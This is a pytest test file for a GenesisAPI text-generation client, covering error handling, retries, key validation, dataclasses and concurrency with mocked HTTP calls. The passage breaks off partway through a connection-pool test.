import pytest
import json
import asyncio
from unittest.mock import Mock, patch, AsyncMock, MagicMock
from datetime import datetime, timezone
import uuid
import logging

# Import the module under test
from app.ai_backend.genesis_api import (
    GenesisAPI,
    GenesisAPIError,
    GenesisAPITimeoutError,
    GenesisAPIAuthenticationError,
    GenesisAPIRateLimitError,
    GenesisAPIServerError,
    GenesisRequest,
    GenesisResponse,
    validate_api_key,
    format_genesis_prompt,
    parse_genesis_response,
    handle_genesis_error,
    retry_with_exponential_backoff
)


class TestGenesisAPI:
    """Test class for GenesisAPI functionality."""

    def setup_method(self):
        """
        Set up a GenesisAPI instance with test credentials before each test.
        
        Initializes the API key and base URL for use in test methods.
        """
        self.api_key = "test_api_key_123"
        self.base_url = "https://api.genesis.example.com"
        self.genesis_api = GenesisAPI(api_key=self.api_key, base_url=self.base_url)

    def teardown_method(self):
        """
        Performs cleanup after each test method execution.
        """
        # Clean up any resources
        pass

    def test_genesis_api_initialization(self):
        """
        Tests that the GenesisAPI initializes correctly with valid API key and base URL, and sets default timeout and max retries.
        """
        api = GenesisAPI(api_key=self.api_key, base_url=self.base_url)
        assert api.api_key == self.api_key
        assert api.base_url == self.base_url
        assert api.timeout == 30  # default timeout
        assert api.max_retries == 3  # default max retries

    def test_genesis_api_initialization_with_custom_params(self):
        """
        Test that GenesisAPI initializes correctly with custom timeout and max_retries parameters.
        """
        api = GenesisAPI(
            api_key=self.api_key,
            base_url=self.base_url,
            timeout=60,
            max_retries=5
        )
        assert api.timeout == 60
        assert api.max_retries == 5

    def test_genesis_api_initialization_invalid_api_key(self):
        """
        Test that initializing GenesisAPI with an invalid API key raises a GenesisAPIAuthenticationError.
        """
        with pytest.raises(GenesisAPIAuthenticationError):
            GenesisAPI(api_key="", base_url=self.base_url)

    def test_genesis_api_initialization_invalid_base_url(self):
        """
        Test that initializing GenesisAPI with an invalid or empty base URL raises a ValueError.
        """
        with pytest.raises(ValueError):
            GenesisAPI(api_key=self.api_key, base_url="")

    @pytest.mark.asyncio
    async def test_generate_text_success(self):
        """
        Tests that generate_text returns a valid GenesisResponse object when the API call is successful.
        """
        mock_response = {
            "id": "test_id_123",
            "text": "Generated text response",
            "model": "genesis-v1",
            "created": 1234567890,
            "usage": {"prompt_tokens": 10, "completion_tokens": 20}
        }
        
        with patch('aiohttp.ClientSession.post') as mock_post:
            mock_post.return_value.__aenter__.return_value.json = AsyncMock(return_value=mock_response)
            mock_post.return_value.__aenter__.return_value.status = 200
            
            result = await self.genesis_api.generate_text("Test prompt")
            
            assert result.text == "Generated text response"
            assert result.model == "genesis-v1"
            assert result.usage["prompt_tokens"] == 10

    @pytest.mark.asyncio
    async def test_generate_text_with_parameters(self):
        """
        Tests that generating text with custom parameters sends the correct request payload and returns the expected response.
        """
        mock_response = {
            "id": "test_id_123",
            "text": "Generated text response",
            "model": "genesis-v2",
            "created": 1234567890,
            "usage": {"prompt_tokens": 15, "completion_tokens": 25}
        }
        
        with patch('aiohttp.ClientSession.post') as mock_post:
            mock_post.return_value.__aenter__.return_value.json = AsyncMock(return_value=mock_response)
            mock_post.return_value.__aenter__.return_value.status = 200
            
            result = await self.genesis_api.generate_text(
                prompt="Test prompt",
                model="genesis-v2",
                max_tokens=100,
                temperature=0.8
            )
            
            # Verify the request was made with correct parameters
            mock_post.assert_called_once()
            call_args = mock_post.call_args
            assert call_args[1]['json']['model'] == "genesis-v2"
            assert call_args[1]['json']['max_tokens'] == 100
            assert call_args[1]['json']['temperature'] == 0.8

    @pytest.mark.asyncio
    async def test_generate_text_authentication_error(self):
        """
        Tests that a 401 Unauthorized response during text generation raises a GenesisAPIAuthenticationError.
        """
        with patch('aiohttp.ClientSession.post') as mock_post:
            mock_post.return_value.__aenter__.return_value.status = 401
            mock_post.return_value.__aenter__.return_value.json = AsyncMock(
                return_value={"error": "Invalid API key"}
            )
            
            with pytest.raises(GenesisAPIAuthenticationError):
                await self.genesis_api.generate_text("Test prompt")

    @pytest.mark.asyncio
    async def test_generate_text_rate_limit_error(self):
        """
        Test that generate_text raises GenesisAPIRateLimitError when the API responds with a 429 status code.
        """
        with patch('aiohttp.ClientSession.post') as mock_post:
            mock_post.return_value.__aenter__.return_value.status = 429
            mock_post.return_value.__aenter__.return_value.json = AsyncMock(
                return_value={"error": "Rate limit exceeded"}
            )
            
            with pytest.raises(GenesisAPIRateLimitError):
                await self.genesis_api.generate_text("Test prompt")

    @pytest.mark.asyncio
    async def test_generate_text_server_error(self):
        """
        Test that a server error (HTTP 500) during text generation raises a GenesisAPIServerError.
        """
        with patch('aiohttp.ClientSession.post') as mock_post:
            mock_post.return_value.__aenter__.return_value.status = 500
            mock_post.return_value.__aenter__.return_value.json = AsyncMock(
                return_value={"error": "Internal server error"}
            )
            
            with pytest.raises(GenesisAPIServerError):
                await self.genesis_api.generate_text("Test prompt")

    @pytest.mark.asyncio
    async def test_generate_text_timeout_error(self):
        """
        Test that a timeout during text generation raises a GenesisAPITimeoutError.
        
        Simulates an asyncio.TimeoutError during an API call and verifies that the client raises the appropriate custom exception.
        """
        with patch('aiohttp.ClientSession.post') as mock_post:
            mock_post.return_value.__aenter__.side_effect = asyncio.TimeoutError()
            
            with pytest.raises(GenesisAPITimeoutError):
                await self.genesis_api.generate_text("Test prompt")

    @pytest.mark.asyncio
    async def test_generate_text_empty_prompt(self):
        """
        Test that generating text with an empty prompt raises a ValueError.
        """
        with pytest.raises(ValueError):
            await self.genesis_api.generate_text("")

    @pytest.mark.asyncio
    async def test_generate_text_none_prompt(self):
        """
        Test that passing None as the prompt to generate_text raises a ValueError.
        """
        with pytest.raises(ValueError):
            await self.genesis_api.generate_text(None)

    @pytest.mark.asyncio
    async def test_generate_text_very_long_prompt(self):
        """
        Test that generating text with an excessively long prompt results in a GenesisAPIError.
        """
        long_prompt = "A" * 10000
        
        with patch('aiohttp.ClientSession.post') as mock_post:
            mock_post.return_value.__aenter__.return_value.status = 400
            mock_post.return_value.__aenter__.return_value.json = AsyncMock(
                return_value={"error": "Prompt too long"}
            )
            
            with pytest.raises(GenesisAPIError):
                await self.genesis_api.generate_text(long_prompt)

    @pytest.mark.asyncio
    async def test_generate_text_with_retry_logic(self):
        """
        Tests that `generate_text` retries on transient HTTP 503 errors and succeeds after a retry.
        
        Simulates an initial 503 Service Unavailable error followed by a successful response, verifying that the retry mechanism enables successful text generation after a transient failure.
        """
        mock_response = {
            "id": "test_id_123",
            "text": "Generated text response",
            "model": "genesis-v1",
            "created": 1234567890,
            "usage": {"prompt_tokens": 10, "completion_tokens": 20}
        }
        
        with patch('aiohttp.ClientSession.post') as mock_post:
            # First call fails with 503, second succeeds
            mock_post.return_value.__aenter__.return_value.status = 503
            mock_post.return_value.__aenter__.return_value.json = AsyncMock(
                side_effect=[
                    {"error": "Service temporarily unavailable"},
                    mock_response
                ]
            )
            
            # Mock the retry logic
            with patch('asyncio.sleep'):
                # Should succeed after retry
                result = await self.genesis_api.generate_text("Test prompt")
                assert result.text == "Generated text response"

    def test_validate_api_key_valid(self):
        """
        Test that `validate_api_key` returns True for a valid API key.
        """
        valid_key = "sk-1234567890abcdef"
        assert validate_api_key(valid_key) == True

    def test_validate_api_key_invalid(self):
        """
        Test that `validate_api_key` returns False for a range of invalid API key formats, including empty, None, and improperly formatted strings.
        """
        invalid_keys = [
            "",
            None,
            "short",
            "invalid_format",
            "sk-",
            "sk-123"
        ]
        
        for key in invalid_keys:
            assert validate_api_key(key) == False

    def test_format_genesis_prompt_basic(self):
        """
        Tests that `format_genesis_prompt` formats a simple prompt and includes all required fields in the resulting dictionary.
        """
        prompt = "Hello world"
        formatted = format_genesis_prompt(prompt)
        assert isinstance(formatted, dict)
        assert formatted["prompt"] == prompt
        assert "model" in formatted
        assert "max_tokens" in formatted

    def test_format_genesis_prompt_with_parameters(self):
        """
        Tests that `format_genesis_prompt` returns a dictionary containing the specified prompt, model, max_tokens, and temperature values.
        """
        prompt = "Test prompt"
        formatted = format_genesis_prompt(
            prompt=prompt,
            model="genesis-v2",
            max_tokens=500,
            temperature=0.9
        )
        
        assert formatted["prompt"] == prompt
        assert formatted["model"] == "genesis-v2"
        assert formatted["max_tokens"] == 500
        assert formatted["temperature"] == 0.9

    def test_format_genesis_prompt_invalid_temperature(self):
        """
        Test that `format_genesis_prompt` raises a ValueError when provided with an out-of-range temperature value.
        """
        with pytest.raises(ValueError):
            format_genesis_prompt("Test", temperature=1.5)

    def test_format_genesis_prompt_invalid_max_tokens(self):
        """
        Test that `format_genesis_prompt` raises a ValueError when given an invalid `max_tokens` value.
        """
        with pytest.raises(ValueError):
            format_genesis_prompt("Test", max_tokens=-1)

    def test_parse_genesis_response_valid(self):
        """
        Verifies that a valid Genesis API response dictionary is parsed into a GenesisResponse object with correct field values.
        """
        response_data = {
            "id": "test_id_123",
            "text": "Generated text",
            "model": "genesis-v1",
            "created": 1234567890,
            "usage": {"prompt_tokens": 10, "completion_tokens": 20}
        }
        
        result = parse_genesis_response(response_data)
        assert isinstance(result, GenesisResponse)
        assert result.id == "test_id_123"
        assert result.text == "Generated text"
        assert result.model == "genesis-v1"
        assert result.created == 1234567890
        assert result.usage["prompt_tokens"] == 10

    def test_parse_genesis_response_missing_required_fields(self):
        """
        Test that `parse_genesis_response` raises `GenesisAPIError` when required fields are absent in the response dictionary.
        
        Verifies that missing fields such as 'id', 'text', or 'model' result in an exception.
        """
        invalid_responses = [
            {},
            {"id": "test"},
            {"text": "test"},
            {"id": "test", "text": "test"}  # missing model
        ]
        
        for response in invalid_responses:
            with pytest.raises(GenesisAPIError):
                parse_genesis_response(response)

    def test_parse_genesis_response_invalid_usage_format(self):
        """
        Test that parsing a response with an incorrectly formatted 'usage' field raises a GenesisAPIError.
        """
        response_data = {
            "id": "test_id_123",
            "text": "Generated text",
            "model": "genesis-v1",
            "created": 1234567890,
            "usage": "invalid_usage_format"
        }
        
        with pytest.raises(GenesisAPIError):
            parse_genesis_response(response_data)

    def test_handle_genesis_error_401(self):
        """
        Test that a 401 status code triggers a GenesisAPIAuthenticationError when handled by handle_genesis_error.
        """
        with pytest.raises(GenesisAPIAuthenticationError):
            handle_genesis_error(401, {"error": "Unauthorized"})

    def test_handle_genesis_error_429(self):
        """
        Test that handle_genesis_error raises GenesisAPIRateLimitError for HTTP 429 status code.
        """
        with pytest.raises(GenesisAPIRateLimitError):
            handle_genesis_error(429, {"error": "Rate limit exceeded"})

    def test_handle_genesis_error_500(self):
        """
        Test that a 500 status code triggers a GenesisAPIServerError when handled by handle_genesis_error.
        """
        with pytest.raises(GenesisAPIServerError):
            handle_genesis_error(500, {"error": "Internal server error"})

    def test_handle_genesis_error_generic(self):
        """
        Test that handle_genesis_error raises GenesisAPIError for non-specific HTTP error status codes.
        """
        with pytest.raises(GenesisAPIError):
            handle_genesis_error(400, {"error": "Bad request"})

    @pytest.mark.asyncio
    async def test_retry_with_exponential_backoff_success(self):
        """
        Test that `retry_with_exponential_backoff` retries a coroutine after a retryable error and returns the successful result on a subsequent attempt.
        """
        mock_func = AsyncMock()
        mock_func.side_effect = [
            GenesisAPIServerError("Server error"),
            "Success"
        ]
        
        with patch('asyncio.sleep'):
            result = await retry_with_exponential_backoff(mock_func, max_retries=2)
            assert result == "Success"
            assert mock_func.call_count == 2

    @pytest.mark.asyncio
    async def test_retry_with_exponential_backoff_max_retries(self):
        """
        Test that `retry_with_exponential_backoff` raises the last exception after exceeding the maximum number of retries.
        
        Verifies that the function stops retrying after the specified limit and that the raised exception matches the last encountered error.
        """
        mock_func = AsyncMock()
        mock_func.side_effect = GenesisAPIServerError("Server error")
        
        with patch('asyncio.sleep'):
            with pytest.raises(GenesisAPIServerError):
                await retry_with_exponential_backoff(mock_func, max_retries=2)
            assert mock_func.call_count == 2

    @pytest.mark.asyncio
    async def test_retry_with_exponential_backoff_non_retryable_error(self):
        """
        Test that `retry_with_exponential_backoff` does not retry on non-retryable errors.
        
        Verifies that when a non-retryable exception such as `GenesisAPIAuthenticationError` is raised, the function is not retried and the exception is immediately propagated.
        """
        mock_func = AsyncMock()
        mock_func.side_effect = GenesisAPIAuthenticationError("Auth error")
        
        with pytest.raises(GenesisAPIAuthenticationError):
            await retry_with_exponential_backoff(mock_func, max_retries=2)
        assert mock_func.call_count == 1  # Should not retry auth errors


class TestGenesisRequest:
    """Test class for GenesisRequest data class."""

    def test_genesis_request_creation(self):
        """
        Verifies that a GenesisRequest instance is created with the correct field values.
        """
        request = GenesisRequest(
            prompt="Test prompt",
            model="genesis-v1",
            max_tokens=100,
            temperature=0.7
        )
        
        assert request.prompt == "Test prompt"
        assert request.model == "genesis-v1"
        assert request.max_tokens == 100
        assert request.temperature == 0.7

    def test_genesis_request_to_dict(self):
        """
        Test that a GenesisRequest instance can be correctly converted to a dictionary with expected field values.
        """
        request = GenesisRequest(
            prompt="Test prompt",
            model="genesis-v1",
            max_tokens=100,
            temperature=0.7
        )
        
        result = request.to_dict()
        assert isinstance(result, dict)
        assert result["prompt"] == "Test prompt"
        assert result["model"] == "genesis-v1"
        assert result["max_tokens"] == 100
        assert result["temperature"] == 0.7

    def test_genesis_request_from_dict(self):
        """
        Test that a GenesisRequest object can be correctly created from a dictionary using the from_dict method.
        """
        data = {
            "prompt": "Test prompt",
            "model": "genesis-v1",
            "max_tokens": 100,
            "temperature": 0.7
        }
        
        request = GenesisRequest.from_dict(data)
        assert request.prompt == "Test prompt"
        assert request.model == "genesis-v1"
        assert request.max_tokens == 100
        assert request.temperature == 0.7

    def test_genesis_request_validation(self):
        """
        Verifies that creating a GenesisRequest with invalid fields (empty prompt, empty model, or negative max_tokens) raises ValueError.
        """
        with pytest.raises(ValueError):
            GenesisRequest(prompt="", model="genesis-v1")
        
        with pytest.raises(ValueError):
            GenesisRequest(prompt="Test", model="", max_tokens=100)
        
        with pytest.raises(ValueError):
            GenesisRequest(prompt="Test", model="genesis-v1", max_tokens=-1)


class TestGenesisResponse:
    """Test class for GenesisResponse data class."""

    def test_genesis_response_creation(self):
        """
        Verifies that a GenesisResponse object is instantiated with the expected field values.
        """
        response = GenesisResponse(
            id="test_id",
            text="Generated text",
            model="genesis-v1",
            created=1234567890,
            usage={"prompt_tokens": 10, "completion_tokens": 20}
        )
        
        assert response.id == "test_id"
        assert response.text == "Generated text"
        assert response.model == "genesis-v1"
        assert response.created == 1234567890
        assert response.usage["prompt_tokens"] == 10

    def test_genesis_response_to_dict(self):
        """
        Tests that the GenesisResponse object's to_dict method returns a dictionary with all fields accurately represented.
        """
        response = GenesisResponse(
            id="test_id",
            text="Generated text",
            model="genesis-v1",
            created=1234567890,
            usage={"prompt_tokens": 10, "completion_tokens": 20}
        )
        
        result = response.to_dict()
        assert isinstance(result, dict)
        assert result["id"] == "test_id"
        assert result["text"] == "Generated text"
        assert result["model"] == "genesis-v1"
        assert result["created"] == 1234567890
        assert result["usage"]["prompt_tokens"] == 10

    def test_genesis_response_from_dict(self):
        """
        Test that GenesisResponse is correctly created from a dictionary and all fields are accurately populated.
        """
        data = {
            "id": "test_id",
            "text": "Generated text",
            "model": "genesis-v1",
            "created": 1234567890,
            "usage": {"prompt_tokens": 10, "completion_tokens": 20}
        }
        
        response = GenesisResponse.from_dict(data)
        assert response.id == "test_id"
        assert response.text == "Generated text"
        assert response.model == "genesis-v1"
        assert response.created == 1234567890
        assert response.usage["prompt_tokens"] == 10


class TestGenesisAPIExceptions:
    """Test class for Genesis API exception classes."""

    def test_genesis_api_error(self):
        """Test GenesisAPIError exception."""
        error = GenesisAPIError("Test error")
        assert str(error) == "Test error"
        assert isinstance(error, Exception)

    def test_genesis_api_authentication_error(self):
        """
        Test that GenesisAPIAuthenticationError is raised with the correct message and inherits from GenesisAPIError.
        """
        error = GenesisAPIAuthenticationError("Auth error")
        assert str(error) == "Auth error"
        assert isinstance(error, GenesisAPIError)

    def test_genesis_api_rate_limit_error(self):
        """
        Verify that the GenesisAPIRateLimitError exception is correctly instantiated, stringified, and inherits from GenesisAPIError.
        """
        error = GenesisAPIRateLimitError("Rate limit error")
        assert str(error) == "Rate limit error"
        assert isinstance(error, GenesisAPIError)

    def test_genesis_api_server_error(self):
        """Test GenesisAPIServerError exception."""
        error = GenesisAPIServerError("Server error")
        assert str(error) == "Server error"
        assert isinstance(error, GenesisAPIError)

    def test_genesis_api_timeout_error(self):
        """
        Tests that the GenesisAPITimeoutError exception is correctly instantiated, stringified, and inherits from GenesisAPIError.
        """
        error = GenesisAPITimeoutError("Timeout error")
        assert str(error) == "Timeout error"
        assert isinstance(error, GenesisAPIError)


class TestGenesisAPIIntegration:
    """Integration tests for Genesis API."""

    def setup_method(self):
        """
        Set up the test API key and base URL for integration tests.
        """
        self.api_key = "test_api_key_123"
        self.base_url = "https://api.genesis.example.com"

    @pytest.mark.asyncio
    async def test_end_to_end_text_generation(self):
        """
        Asynchronously tests the full text generation workflow of GenesisAPI, ensuring that a valid prompt returns a correctly parsed GenesisResponse object with expected fields.
        """
        genesis_api = GenesisAPI(api_key=self.api_key, base_url=self.base_url)
        
        mock_response = {
            "id": "test_id_123",
            "text": "This is a generated response",
            "model": "genesis-v1",
            "created": 1234567890,
            "usage": {"prompt_tokens": 5, "completion_tokens": 10}
        }
        
        with patch('aiohttp.ClientSession.post') as mock_post:
            mock_post.return_value.__aenter__.return_value.json = AsyncMock(return_value=mock_response)
            mock_post.return_value.__aenter__.return_value.status = 200
            
            # Test the complete workflow
            result = await genesis_api.generate_text("Hello, world!")
            
            assert result.text == "This is a generated response"
            assert result.model == "genesis-v1"
            assert result.usage["prompt_tokens"] == 5
            assert result.usage["completion_tokens"] == 10

    @pytest.mark.asyncio
    async def test_concurrent_requests(self):
        """
        Test that GenesisAPI handles multiple concurrent text generation requests and returns correct responses.
        
        This test ensures that asynchronous calls to `generate_text` can be executed concurrently, and each returns the expected mocked response.
        """
        genesis_api = GenesisAPI(api_key=self.api_key, base_url=self.base_url)
        
        mock_response = {
            "id": "test_id_123",
            "text": "Concurrent response",
            "model": "genesis-v1",
            "created": 1234567890,
            "usage": {"prompt_tokens": 5, "completion_tokens": 10}
        }
        
        with patch('aiohttp.ClientSession.post') as mock_post:
            mock_post.return_value.__aenter__.return_value.json = AsyncMock(return_value=mock_response)
            mock_post.return_value.__aenter__.return_value.status = 200
            
            # Create multiple concurrent requests
            tasks = [
                genesis_api.generate_text(f"Prompt {i}")
                for i in range(5)
            ]
            
            results = await asyncio.gather(*tasks)
            
            assert len(results) == 5
            for result in results:
                assert result.text == "Concurrent response"
                assert result.model == "genesis-v1"

    @pytest.mark.asyncio
    async def test_context_manager_usage(self):
        """
        Verifies that GenesisAPI functions correctly as an asynchronous context manager, allowing text generation within the managed context.
        """
        with patch('aiohttp.ClientSession') as mock_session:
            async with GenesisAPI(api_key=self.api_key, base_url=self.base_url) as api:
                mock_response = {
                    "id": "test_id_123",
                    "text": "Context manager response",
                    "model": "genesis-v1",
                    "created": 1234567890,
                    "usage": {"prompt_tokens": 5, "completion_tokens": 10}
                }
                
                mock_session.return_value.post.return_value.__aenter__.return_value.json = AsyncMock(return_value=mock_response)
                mock_session.return_value.post.return_value.__aenter__.return_value.status = 200
                
                result = await api.generate_text("Test prompt")
                assert result.text == "Context manager response"


# Fixtures for common test data
@pytest.fixture
def sample_genesis_request():
    """
    Pytest fixture that provides a sample GenesisRequest instance with preset values for use in tests.
    
    Returns:
        GenesisRequest: A GenesisRequest object with example prompt, model, max_tokens, and temperature.
    """
    return GenesisRequest(
        prompt="Test prompt",
        model="genesis-v1",
        max_tokens=100,
        temperature=0.7
    )


@pytest.fixture
def sample_genesis_response():
    """
    Provides a sample GenesisResponse object for use in tests.
    
    Returns:
        GenesisResponse: A GenesisResponse instance with preset test values.
    """
    return GenesisResponse(
        id="test_id_123",
        text="Generated text response",
        model="genesis-v1",
        created=1234567890,
        usage={"prompt_tokens": 10, "completion_tokens": 20}
    )


@pytest.fixture
def mock_genesis_api():
    """
    Provides a pytest fixture that returns a mocked GenesisAPI instance with test credentials for use in unit tests.
    """
    return GenesisAPI(api_key="test_api_key", base_url="https://api.genesis.example.com")


# Performance tests
class TestGenesisAPIPerformance:
    """Performance tests for Genesis API."""

    @pytest.mark.asyncio
    async def test_response_time_measurement(self):
        """
        Measures the response time of a mocked API call and asserts that it completes quickly and returns the expected text.
        """
        genesis_api = GenesisAPI(api_key="test_key", base_url="https://api.genesis.example.com")
        
        mock_response = {
            "id": "test_id_123",
            "text": "Performance test response",
            "model": "genesis-v1",
            "created": 1234567890,
            "usage": {"prompt_tokens": 5, "completion_tokens": 10}
        }
        
        with patch('aiohttp.ClientSession.post') as mock_post:
            mock_post.return_value.__aenter__.return_value.json = AsyncMock(return_value=mock_response)
            mock_post.return_value.__aenter__.return_value.status = 200
            
            start_time = datetime.now()
            result = await genesis_api.generate_text("Performance test")
            end_time = datetime.now()
            
            response_time = (end_time - start_time).total_seconds()
            assert response_time < 1.0  # Should complete quickly in mock
            assert result.text == "Performance test response"

    @pytest.mark.asyncio
    async def test_large_batch_processing(self):
        """
        Tests that GenesisAPI can handle a large batch of 50 concurrent text generation requests, returning the expected response for each prompt.
        """
        genesis_api = GenesisAPI(api_key="test_key", base_url="https://api.genesis.example.com")
        
        mock_response = {
            "id": "test_id_123",
            "text": "Batch response",
            "model": "genesis-v1",
            "created": 1234567890,
            "usage": {"prompt_tokens": 5, "completion_tokens": 10}
        }
        
        with patch('aiohttp.ClientSession.post') as mock_post:
            mock_post.return_value.__aenter__.return_value.json = AsyncMock(return_value=mock_response)
            mock_post.return_value.__aenter__.return_value.status = 200
            
            # Process 50 requests in batch
            batch_size = 50
            prompts = [f"Batch prompt {i}" for i in range(batch_size)]
            
            tasks = [genesis_api.generate_text(prompt) for prompt in prompts]
            results = await asyncio.gather(*tasks)
            
            assert len(results) == batch_size
            for result in results:
                assert result.text == "Batch response"


# Edge case tests
class TestGenesisAPIEdgeCases:
    """Edge case tests for Genesis API."""

    @pytest.mark.asyncio
    async def test_unicode_prompt_handling(self):
        """
        Verify that GenesisAPI can handle prompts containing Unicode characters and returns the correct response.
        """
        genesis_api = GenesisAPI(api_key="test_key", base_url="https://api.genesis.example.com")
        
        unicode_prompt = "Hello 世界 🌍 émojis and spëcial chars"
        
        mock_response = {
            "id": "test_id_123",
            "text": "Unicode response",
            "model": "genesis-v1",
            "created": 1234567890,
            "usage": {"prompt_tokens": 10, "completion_tokens": 20}
        }
        
        with patch('aiohttp.ClientSession.post') as mock_post:
            mock_post.return_value.__aenter__.return_value.json = AsyncMock(return_value=mock_response)
            mock_post.return_value.__aenter__.return_value.status = 200
            
            result = await genesis_api.generate_text(unicode_prompt)
            assert result.text == "Unicode response"

    @pytest.mark.asyncio
    async def test_malformed_json_response(self):
        """
        Tests that a malformed JSON response from the API during text generation raises a GenesisAPIError.
        """
        genesis_api = GenesisAPI(api_key="test_key", base_url="https://api.genesis.example.com")
        
        with patch('aiohttp.ClientSession.post') as mock_post:
            mock_post.return_value.__aenter__.return_value.json = AsyncMock(
                side_effect=json.JSONDecodeError("Invalid JSON", "", 0)
            )
            mock_post.return_value.__aenter__.return_value.status = 200
            
            with pytest.raises(GenesisAPIError):
                await genesis_api.generate_text("Test prompt")

    @pytest.mark.asyncio
    async def test_network_connection_error(self):
        """
        Tests that a network connection error during a text generation request results in a GenesisAPIError being raised.
        """
        genesis_api = GenesisAPI(api_key="test_key", base_url="https://api.genesis.example.com")
        
        with patch('aiohttp.ClientSession.post') as mock_post:
            mock_post.side_effect = aiohttp.ClientConnectionError("Connection failed")
            
            with pytest.raises(GenesisAPIError):
                await genesis_api.generate_text("Test prompt")


if __name__ == "__main__":
    pytest.main([__file__])

# Additional comprehensive test scenarios
class TestGenesisAPIAdvancedScenarios:
    """Advanced test scenarios for comprehensive coverage."""
    
    def setup_method(self):
        """
        Set up a GenesisAPI instance with test credentials for advanced scenario tests.
        """
        self.api_key = "test_api_key_advanced"
        self.base_url = "https://api.genesis.example.com"
        self.genesis_api = GenesisAPI(api_key=self.api_key, base_url=self.base_url)

    @pytest.mark.asyncio
    async def test_generate_text_with_extreme_parameters(self):
        """
        Tests that the GenesisAPI can generate text successfully when called with extreme values for parameters such as maximum tokens and temperature.
        
        Verifies that valid responses are returned when using the highest allowed max_tokens, minimum temperature (0.0), and maximum temperature (1.0).
        """
        mock_response = {
            "id": "extreme_test_id",
            "text": "Extreme parameters response",
            "model": "genesis-v1",
            "created": 1234567890,
            "usage": {"prompt_tokens": 1, "completion_tokens": 4096}
        }
        
        with patch('aiohttp.ClientSession.post') as mock_post:
            mock_post.return_value.__aenter__.return_value.json = AsyncMock(return_value=mock_response)
            mock_post.return_value.__aenter__.return_value.status = 200
            
            # Test with maximum tokens
            result = await self.genesis_api.generate_text(
                prompt="Test",
                max_tokens=4096,
                temperature=0.0
            )
            assert result.text == "Extreme parameters response"
            
            # Test with minimum temperature
            result = await self.genesis_api.generate_text(
                prompt="Test",
                temperature=0.0
            )
            assert result.text == "Extreme parameters response"
            
            # Test with maximum temperature
            result = await self.genesis_api.generate_text(
                prompt="Test",
                temperature=1.0
            )
            assert result.text == "Extreme parameters response"

    @pytest.mark.asyncio
    async def test_memory_efficient_large_response_handling(self):
        """
        Asynchronously verifies that the API client can handle and process a very large (50KB) text response efficiently.
        
        This test mocks a large API response and asserts that the generated text and token usage are correctly returned without errors.
        """
        large_text = "A" * 50000  # 50KB response
        mock_response = {
            "id": "large_response_id",
            "text": large_text,
            "model": "genesis-v1",
            "created": 1234567890,
            "usage": {"prompt_tokens": 10, "completion_tokens": 50000}
        }
        
        with patch('aiohttp.ClientSession.post') as mock_post:
            mock_post.return_value.__aenter__.return_value.json = AsyncMock(return_value=mock_response)
            mock_post.return_value.__aenter__.return_value.status = 200
            
            result = await self.genesis_api.generate_text("Generate large text")
            assert len(result.text) == 50000
            assert result.usage["completion_tokens"] == 50000

    @pytest.mark.asyncio
    async def test_api_key_security_validation(self):
        """
        Verifies that the API key is not exposed in the string representation of the GenesisAPI instance.
        """
        # Test that API key is not logged or exposed
        with patch('logging.getLogger') as mock_logger:
            api = GenesisAPI(api_key="secret_key_123", base_url=self.base_url)
            # Verify API key is stored securely and not exposed in string representation
            api_str = str(api)
            assert "secret_key_123" not in api_str
            
    def test_validate_api_key_comprehensive_formats(self):
        """
        Verify that `validate_api_key` correctly accepts a range of valid API key formats and rejects various invalid or malformed formats, ensuring robust API key validation.
        """
        # Valid formats
        valid_keys = [
            "sk-1234567890abcdef1234567890abcdef",
            "sk-ABCDEF1234567890abcdef1234567890",
            "sk-" + "a" * 48,  # 50 char total
        ]
        
        for key in valid_keys:
            assert validate_api_key(key) == True, f"Valid key {key} should pass validation"
            
        # Invalid formats - edge cases
        invalid_keys = [
            "sk-" + "a" * 5,    # Too short
            "sk-" + "a" * 100,  # Too long
            "sk-abc@def",       # Invalid characters
            "sk- " + "a" * 20,  # Space in key
            "sk-\n" + "a" * 20, # Newline in key
            "sk-\t" + "a" * 20, # Tab in key
        ]
        
        for key in invalid_keys:
            assert validate_api_key(key) == False, f"Invalid key {key} should fail validation"

    @pytest.mark.asyncio
    async def test_concurrent_rate_limiting_scenarios(self):
        """
        Tests that multiple concurrent requests to GenesisAPI raise GenesisAPIRateLimitError when the API responds with HTTP 429 rate limiting errors.
        """
        genesis_api = GenesisAPI(api_key=self.api_key, base_url=self.base_url)
        
        with patch('aiohttp.ClientSession.post') as mock_post:
            # Simulate rate limiting for first few requests, then success
            mock_post.return_value.__aenter__.return_value.status = 429
            mock_post.return_value.__aenter__.return_value.json = AsyncMock(
                return_value={"error": "Rate limit exceeded", "retry_after": 1}
            )
            
            # Test multiple concurrent requests hitting rate limit
            tasks = [
                genesis_api.generate_text(f"Concurrent prompt {i}")
                for i in range(3)
            ]
            
            with pytest.raises(GenesisAPIRateLimitError):
                await asyncio.gather(*tasks, return_exceptions=True)

    @pytest.mark.asyncio
    async def test_request_id_tracking(self):
        """
        Test that GenesisAPI assigns and returns a valid UUID as the request ID in the response, enabling request-response correlation.
        """
        request_id = str(uuid.uuid4())
        mock_response = {
            "id": request_id,
            "text": "Tracked response",
            "model": "genesis-v1",
            "created": 1234567890,
            "usage": {"prompt_tokens": 5, "completion_tokens": 10}
        }
        
        with patch('aiohttp.ClientSession.post') as mock_post:
            mock_post.return_value.__aenter__.return_value.json = AsyncMock(return_value=mock_response)
            mock_post.return_value.__aenter__.return_value.status = 200
            
            result = await self.genesis_api.generate_text("Track this request")
            assert result.id == request_id
            
            # Verify request ID is properly formatted UUID
            uuid.UUID(result.id)  # Should not raise exception

    @pytest.mark.asyncio
    async def test_response_streaming_simulation(self):
        """
        Tests that the GenesisAPI client can handle and correctly process simulated streaming or chunked API responses.
        """
        # Test chunked response processing
        mock_response = {
            "id": "stream_test_id",
            "text": "This is a streaming response that comes in chunks",
            "model": "genesis-v1",
            "created": 1234567890,
            "usage": {"prompt_tokens": 8, "completion_tokens": 15}
        }
        
        with patch('aiohttp.ClientSession.post') as mock_post:
            mock_post.return_value.__aenter__.return_value.json = AsyncMock(return_value=mock_response)
            mock_post.return_value.__aenter__.return_value.status = 200
            
            result = await self.genesis_api.generate_text("Stream this response")
            assert "streaming response" in result.text

    @pytest.mark.asyncio
    async def test_connection_pool_management(self):
        """
        Verify that GenesisAPI correctly manages and cleans up its connection pool when used as an asynchronous context manager by ensuring successful API calls within the context.
        """
        # Test that connections are properly managed
        async with GenesisAPI(api_key=self.api_key, base_url=self.base_url) as api:
            mock_response = {
                "id": "pool_test_id",
                "text": "Connection pool response",
                "model": "genesis-v1",
                "created": 1234567890,
                "usage": {"prompt_tokens": 5, "completion_tokens": 10}
            }
            
            with patch('aiohttp.ClientSession.post') as mock_post:
